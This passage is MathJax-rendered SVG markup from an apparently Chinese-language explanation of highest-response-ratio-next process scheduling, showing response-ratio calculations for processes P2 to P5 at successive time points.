634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z" transform="translate(1278,0)"></path></g><g data-mml-node="mo" transform="translate(11763.7,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container>、<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.781ex" xmlns="http://www.w3.org/2000/svg" width="24.603ex" height="3.15ex" role="img" focusable="false" viewBox="0 -1047.1 10874.7 1392.1"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g><g data-mml-node="mn" transform="translate(675,-150) scale(0.707)"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path></g></g><g data-mml-node="mo" transform="translate(1078.6,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(1467.6,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">响</text></g><g data-mml-node="mi" transform="translate(2367.6,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">应</text></g><g data-mml-node="mi" transform="translate(3267.6,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">比</text></g><g data-mml-node="mo" transform="translate(4445.3,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mfrac" transform="translate(5501.1,0)"><g data-mml-node="mrow" transform="translate(220,516.8) scale(0.707)"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(389,0)"><path data-c="37" d="M55 458Q56 460 72 567L88 674Q88 676 108 676H128V672Q128 662 143 655T195 646T364 644H485V605L417 512Q408 500 387 472T360 435T339 403T319 367T305 330T292 284T284 230T278 162T275 80Q275 66 275 52T274 28V19Q270 2 255 -10T221 -22Q210 -22 200 -19T179 0T168 40Q168 198 265 368Q285 400 349 489L395 552H302Q128 552 119 546Q113 543 108 522T98 479L95 458V455H55V458Z"></path></g><g data-mml-node="mo" transform="translate(889,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mn" transform="translate(1667,0)"><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z"></path></g><g data-mml-node="mo" transform="translate(2167,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(2556,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mn" transform="translate(3334,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g><g data-mml-node="mn" transform="translate(1398.7,-345) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><rect width="2911" height="60" x="120" y="220"></rect></g><g data-mml-node="mo" transform="translate(8929.9,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(9985.7,0)"><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z"></path></g><g data-mml-node="mo" transform="translate(10485.7,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container>、<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.781ex" xmlns="http://www.w3.org/2000/svg" width="26.364ex" height="3.15ex" role="img" focusable="false" viewBox="0 -1047.1 11652.7 1392.1"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g><g data-mml-node="mn" transform="translate(675,-150) scale(0.707)"><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z"></path></g></g><g data-mml-node="mo" transform="translate(1078.6,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(1467.6,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">响</text></g><g data-mml-node="mi" transform="translate(2367.6,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">应</text></g><g data-mml-node="mi" transform="translate(3267.6,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">比</text></g><g data-mml-node="mo" transform="translate(4445.3,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mfrac" transform="translate(5501.1,0)"><g data-mml-node="mrow" transform="translate(220,516.8) scale(0.707)"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(389,0)"><path data-c="37" d="M55 458Q56 460 72 567L88 674Q88 676 108 676H128V672Q128 662 143 655T195 646T364 644H485V605L417 512Q408 500 387 472T360 435T339 403T319 367T305 330T292 284T284 230T278 162T275 80Q275 66 275 52T274 28V19Q270 2 255 -10T221 -22Q210 -22 200 -19T179 0T168 40Q168 198 265 368Q285 400 349 489L395 552H302Q128 552 119 546Q113 543 108 522T98 479L95 458V455H55V458Z"></path></g><g data-mml-node="mo" transform="translate(889,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mn" transform="translate(1667,0)"><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z"></path></g><g data-mml-node="mo" transform="translate(2167,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(2556,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mn" transform="translate(3334,0)"><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z"></path></g></g><g data-mml-node="mn" transform="translate(1398.7,-345) scale(0.707)"><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z"></path></g><rect width="2911" height="60" x="120" y="220"></rect></g><g data-mml-node="mo" transform="translate(8929.9,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(9985.7,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path><path data-c="2E" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60Z" transform="translate(500,0)"></path><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z" transform="translate(778,0)"></path></g><g data-mml-node="mo" transform="translate(11263.7,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container></p><p>8时刻(P3完成)：<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.781ex" xmlns="http://www.w3.org/2000/svg" width="26.364ex" height="3.15ex" role="img" focusable="false" viewBox="0 -1047.1 11652.7 1392.1"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g><g data-mml-node="mn" transform="translate(675,-150) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(1078.6,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(1467.6,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">响</text></g><g data-mml-node="mi" transform="translate(2367.6,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">应</text></g><g data-mml-node="mi" transform="translate(3267.6,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">比</text></g><g data-mml-node="mo" transform="translate(4445.3,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mfrac" transform="translate(5501.1,0)"><g data-mml-node="mrow" transform="translate(220,516.8) scale(0.707)"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(389,0)"><path data-c="38" d="M70 417T70 494T124 618T248 666Q319 666 374 624T429 515Q429 485 418 459T392 417T361 389T335 371T324 363L338 354Q352 344 366 334T382 323Q457 264 457 174Q457 95 399 37T249 -22Q159 -22 101 29T43 155Q43 263 172 335L154 348Q133 361 127 368Q70 417 70 494ZM286 386L292 390Q298 394 301 396T311 403T323 413T334 425T345 438T355 454T364 471T369 491T371 513Q371 556 342 586T275 624Q268 625 242 625Q201 625 165 599T128 534Q128 511 141 492T167 463T217 431Q224 426 228 424L286 386ZM250 21Q308 21 350 55T392 137Q392 154 387 169T375 194T353 216T330 234T301 253T274 270Q260 279 244 289T218 306L210 311Q204 311 181 294T133 239T107 157Q107 98 150 60T250 21Z"></path></g><g data-mml-node="mo" transform="translate(889,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mn" transform="translate(1667,0)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mo" transform="translate(2167,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(2556,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mn" transform="translate(3334,0)"><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z"></path></g></g><g data-mml-node="mn" transform="translate(1398.7,-345) scale(0.707)"><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z"></path></g><rect width="2911" height="60" x="120" y="220"></rect></g><g data-mml-node="mo" transform="translate(8929.9,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(9985.7,0)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path><path data-c="2E" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60Z" transform="translate(500,0)"></path><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z" transform="translate(778,0)"></path></g><g data-mml-node="mo" transform="translate(11263.7,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container>、<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.781ex" xmlns="http://www.w3.org/2000/svg" width="27.495ex" height="3.15ex" role="img" focusable="false" viewBox="0 -1047.1 12152.7 1392.1"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g><g data-mml-node="mn" transform="translate(675,-150) scale(0.707)"><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z"></path></g></g><g data-mml-node="mo" transform="translate(1078.6,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(1467.6,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">响</text></g><g data-mml-node="mi" transform="translate(2367.6,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">应</text></g><g data-mml-node="mi" transform="translate(3267.6,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">比</text></g><g data-mml-node="mo" transform="translate(4445.3,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mfrac" transform="translate(5501.1,0)"><g data-mml-node="mrow" transform="translate(220,516.8) scale(0.707)"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(389,0)"><path data-c="38" d="M70 417T70 494T124 618T248 666Q319 666 374 624T429 515Q429 485 418 459T392 417T361 389T335 371T324 363L338 354Q352 344 366 334T382 323Q457 264 457 174Q457 95 399 37T249 -22Q159 -22 101 29T43 155Q43 263 172 335L154 348Q133 361 127 368Q70 417 70 494ZM286 386L292 390Q298 394 301 396T311 403T323 413T334 425T345 438T355 454T364 471T369 491T371 513Q371 556 342 586T275 624Q268 625 242 625Q201 625 165 599T128 534Q128 511 141 492T167 463T217 431Q224 426 228 424L286 386ZM250 21Q308 21 350 55T392 137Q392 154 387 169T375 194T353 216T330 234T301 253T274 270Q260 279 244 289T218 306L210 311Q204 311 181 294T133 239T107 157Q107 98 150 60T250 21Z"></path></g><g data-mml-node="mo" transform="translate(889,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mn" transform="translate(1667,0)"><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z"></path></g><g data-mml-node="mo" transform="translate(2167,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(2556,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mn" transform="translate(3334,0)"><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z"></path></g></g><g data-mml-node="mn" transform="translate(1398.7,-345) scale(0.707)"><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z"></path></g><rect width="2911" height="60" x="120" y="220"></rect></g><g data-mml-node="mo" 